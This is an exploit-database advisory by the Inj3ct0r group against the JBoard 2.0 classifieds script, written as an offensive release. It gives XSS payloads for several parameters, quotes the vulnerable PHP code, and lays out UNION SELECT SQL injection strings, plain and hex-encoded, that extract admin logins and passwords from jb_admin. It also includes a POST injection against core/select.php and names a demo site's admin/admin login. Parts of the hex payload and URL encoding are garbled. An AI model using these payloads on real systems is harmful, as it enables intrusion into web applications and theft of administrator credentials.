================================================
JBoard &lt;= 2.0 Commercial Version Sql/Xss Exploit
================================================


1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_&lt;_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      0
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1

#[+] Discovered By   : Inj3ct0r
#[+] Site            : Inj3ct0r.com
#[+] Support e-mail  : submit[at]inj3ct0r.com
#[+] Visit : inj3ct0r.com , inj3ct0r.org , inj3ct0r.net


Site product: http://allpublication.ru/
Demo: http://allpublication.ru/board/demo/
admin; admin
Version: 2.0

-----------------------------------------------------------------

Xss Exploit:

editform.php?notice=&lt;script&gt;alert(&#039;www.example.com&#039;)&lt;/script&gt;

*?user_title=&lt;/title&gt;&lt;script&gt;alert(&#039;www.example.org&#039;)&lt;/script&gt;

*any pages because vulnerability in inc/head.inc.php

core/edit_user_message.php?edit_user_message=&quot;&gt;&lt;script&gt;alert(www.example.net)&lt;/script&gt;&lt;noscript&gt;

------------------------------------------------------------------


SQL-Inj3ct0r Exploit:  

1) sboard.php

elseif (!@$_GET[&#039;id_mess&#039;] &amp;&amp; !@$_GET[&#039;id_cat&#039;] &amp;&amp; (@$_GET[&#039;op&#039;] == &quot;all_cat&quot; || @$_GET[&#039;city&#039;])) require_once(&quot;core/all_cat.php&quot;);

2) all_cat.php

if ($c[&#039;print_top&#039;] == &quot;yes&quot;) require_once(&quot;inc/top_add.inc.php&quot;); 

3) top_add.inc.php

There is a request to the database with the parameter $_GET[&#039;city&#039;], which is never filtered

if (@$_GET[&#039;city&#039;]) 
{ 
    $from_city_query = mysql_query (&quot;SELECT city_name FROM jb_city WHERE city_translit = &#039;&quot;.$_GET[&#039;city&#039;].&quot;&#039; LIMIT 1&quot;);  
    if (mysql_num_rows ($from_city_query) == 1) 
    { 
        $from_city = mysql_fetch_assoc ($from_city_query); 
        $city_from_search = &quot; AND city = &#039;&quot;.$from_city[&#039;city_name&#039;].&quot;&#039; &quot;; 

The result is used in the second query:

 $top_add = mysql_query (&quot;SELECT A.id as board_id, A.*, B.* FROM jb_board as A, jb_board_cat as B WHERE A.id_category = B.id AND old_mess = &#039;old&#039; &quot;.@$city_from_search.&quot; ORDER by hits DESC LIMIT $limit&quot;);  
if (mysql_num_rows($top_add)) 
{ 
?&gt; 

&lt;H4&gt;&lt;?=$lang[610]?&gt;&lt;/H4&gt; 
&lt;table border=&quot;0&quot; class=&quot;GRayBox&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt; 
  &lt;tr class=&quot;top&quot;&gt; 
    &lt;td class=&quot;img1&quot;&gt;&amp;nbsp;&lt;/td&gt; 
    &lt;td class=&quot;img2&quot;&gt;&amp;nbsp;&lt;/td&gt; 
    &lt;td class=&quot;img3&quot;&gt;&amp;nbsp;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td class=&quot;imgL&quot;&gt;&amp;nbsp;&lt;/td&gt; 
    &lt;td class=&quot;t&quot;&gt;&lt;a href=&quot;#&quot;&gt; 
      &lt;? 
    while ($top = mysql_fetch_assoc ($top_add)) 
    { 
        $tip = str_replace(&quot;\r\n&quot;,&quot; &quot;, htmlspecialchars($top[&#039;text&#039;])); 
        echo &quot;&lt;a href=\&quot;&quot;.$h.&quot;/advertisement/nesting/&quot;.$top[&#039;id_category&#039;].&quot;/kind/&quot;.$top[&#039;board_id&#039;].&quot;/\&quot; onmouseover=\&quot;Tip(&#039;&quot;.$tip.&quot;&#039;)\&quot;&gt;&lt;strong&gt;&quot;.$top[&#039;title&#039;].&quot;&lt;/strong&gt;&lt;/a&gt;&quot;; 


Request number 1:

a &#039;UNION SELECT 1 --

Request number 2:

a &#039;UNION SELECT 1,2,3,4,5,6, concat_ws (0x3,login,password), 8,9,10,1 1,12,13,14,15,16,17,18,19, 20,21,22,23,24,25,26,27, 28,29,30,31,32,33,34 FROM jb_admin --
Transferred to the number (* 16):
0x612720554e494f4e2053454c45435420312c322c332c342c352c362c636f6e6361745f7773283078332c6c6f67696e2c70617373776f7264292c382c392c31302c31312c31322c31332c31342c31352c31362c31372c31382c31392c32302c32312c32322c32332c32342c32352c32362c32372c32382c32392c33302c33312c33322c33332c33342046524f4d206a625f61646d696e202d2d20

As a result, we obtain the following query:

sboard.php?city=a&#039;+union+select+0x612720554e494f4e2053454c45435420312c322c332c342c352c362c636f6e6361 745f7773283078332c6c6f67696e2c70617373776f7264292c 382c392c31302c31312c31322c31332c31342c31352c31362c 31372c31382c31392c32302c32312c32322c32332c32342c32 352c32362c32372c32382c32392c33302c33312c33322c3333 2c33342046524f4d206a625f61646d696e202d2d20% 20 -% 20

-------------------------------------------------------------------

SQL-Inj3ct0r Exploit:

POST request to /core/select.php

aaaaaaa &#039;UNION SELECT 1,2, concat_ws (0x3, login, password), 4,5,6 FROM jb_admin --
Output will be the last element of the drop-down
A vulnerable piece of code: paste the whole file)

---------------------------------

ThE End =]  Visit my proj3ct  :

http://inj3ct0r.com
http://inj3ct0r.org
http://inj3ct0r.net


# ~  - [ [ : Inj3ct0r : ] ]
